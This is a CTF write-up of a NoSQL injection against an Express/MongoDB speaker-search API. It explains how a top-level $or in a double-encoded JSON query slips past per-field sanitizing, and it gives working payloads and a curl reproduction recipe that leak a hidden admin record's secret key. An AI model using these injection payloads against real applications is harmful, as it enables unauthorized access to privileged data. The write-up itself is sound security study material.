# NoSQLi: Double-Encoded JSON Query + Top-Level $or Bypass

## Context
Seen on a Node/Express + MongoDB conference portal (TechCon-style CTF). The
search endpoint accepted a query that was JSON **twice**:

    {"query":"{\"name\": \"...\"}"}

The inner string is `JSON.parse`'d server-side into a Mongo filter. This is a
distinct surface from a raw JSON body — you must escape the inner JSON so the
outer JSON string stays valid.

## Default behavior (the "overlooked" leak)
- A normal search returns ALL matching speakers, and **every record leaks an
  `isAdmin` boolean** in the response. That alone is sensitive-data exposure.
- The public UI only renders `name/title/company/bio/presentations`, but the
  API response object carries extra fields (`isAdmin`, `hidden`, `secretKey`,
  `internalNotes`, `__v`, `createdAt`) that the client never displays.

## Defense the server had
When you send `{"query":"{...}"}` with an operator on a *known* field like
`name`, the server rejected it:

    {"query":"{\"name\": {\"$ne\": \"\"}}"}  -> {"error":"Invalid search terms"}
    {"query":"{\"name\": {\"$regex\": \".*\"}}"}  -> returns all (operator ALLOWED here)
    {"query":"{\"hidden\":true}"} -> server forces hidden:false (no hidden rows)
    {"query":"{\"isAdmin\":{\"$ne\":false}}"} -> {"error":"Invalid search terms"}

So per-field operator stripping + a forced `hidden:false` look like they block
enumeration of the privileged record.

## Bypass that worked
Use a **top-level `$or`** so the operator is not attached to a validated field
and the `hidden` check is not the top-level filter:

    POST /api/speakers/search
    Content-Type: application/json

    {"query":"{\"$or\":[{\"hidden\":true},{\"isAdmin\":true}]}"}

Returns the HIDDEN admin speaker that the UI never shows, with:

    "isAdmin": true,
    "hidden": true,
    "secretKey": "BI{n0_sql_n0_pr0bl3m_9f82a1c4}",
    "internalNotes": "TODO: Fix the search functionality vulnerability..."

## Why it works
- The sanitizer walks known user-controlled fields (e.g. `name`, `email`) and
  strips `$`-prefixed keys there. A top-level `$or` is not one of those fields,
  so its nested `hidden`/`isAdmin` operators are passed straight to Mongo.
- The `hidden:false` guard is applied only when `hidden` is the top-level key;
  inside `$or` it is not normalized away.

## Other recon that paid off on this target
- `/js/main.js` exposed the exact endpoint + the double-encoding scheme.
  Always read the JS that calls the API before guessing the body format.
- `/speakers` was served as a raw, UNRENDERED template (EJS-style
  `${speaker.bio}` visible in HTML). Template-source disclosure reveals the
  full data model (`speaker.image/name/title/company/bio/presentations`) which
  tells you which fields to request/exfiltrate.

## Reproduction recipe (curl)
```bash
# 1) discover the endpoint + body shape from JS
curl -s http://TARGET/js/main.js | grep -i "fetch("

# 2) confirm leak: normal search returns isAdmin on every record
curl -s -X POST http://TARGET/api/speakers/search \
  -H "Content-Type: application/json" \
  -d '{"query":"{\"name\": {\"$regex\": \".*\"}}"}'

# 3) bypass hidden/admin filter with top-level $or
curl -s -X POST http://TARGET/api/speakers/search \
  -H "Content-Type: application/json" \
  -d '{"query":"{\"$or\":[{\"hidden\":true},{\"isAdmin\":true}]}"}'
```

## Flag-format gotcha (this engagement only)
The API returned the secret as `BI{...}` but the challenge page required the
wrapping `ctf7{...}`. When a CTF returns a token with a different wrapper than
the stated submission format, try BOTH the raw value and the inner content
re-wrapped in the stated prefix.
